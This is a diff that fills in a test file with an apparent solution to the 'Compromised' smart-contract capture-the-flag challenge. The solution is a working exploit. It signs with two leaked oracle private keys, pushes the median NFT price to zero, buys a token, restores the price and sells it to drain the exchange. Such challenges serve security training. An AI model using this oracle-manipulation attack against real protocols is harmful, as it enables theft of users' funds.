@@ -19,7 +19,7 @@ describe('Compromised challenge', function () {
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, player] = await ethers.getSigners();
+        [deployer, player, ...acc] = await ethers.getSigners();
         
         // Initialize balance of the trusted source addresses
         for (let i = 0; i < sources.length; i++) {
@@ -52,7 +52,33 @@ describe('Compromised challenge', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const symbol = 'DVNFT';
+
+        // decode leaked bytes using online tool: https://cryptii.com/pipes/base64-to-hex
+        const privateKey1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        const privateKey2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+
+        // const provider = new ethers.providers.getDefaultProvider();
+
+        const wallet1 = new ethers.Wallet(privateKey1);
+        const signer1 = wallet1.connect(ethers.provider);
+
+        const wallet2 = new ethers.Wallet(privateKey2);
+        const signer2 = wallet2.connect(ethers.provider);
+
+        // set 2 of 3 oracles price 0, median will be 0
+        await oracle.connect(signer1).postPrice(symbol, 0);
+        await oracle.connect(signer2).postPrice(symbol, 0);
+
+        await exchange.connect(player).buyOne({value: 1});
+
+        // set oracles back to original price, median will be 999
+        await oracle.connect(signer1).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(signer2).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // sell token for 999 ETH
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
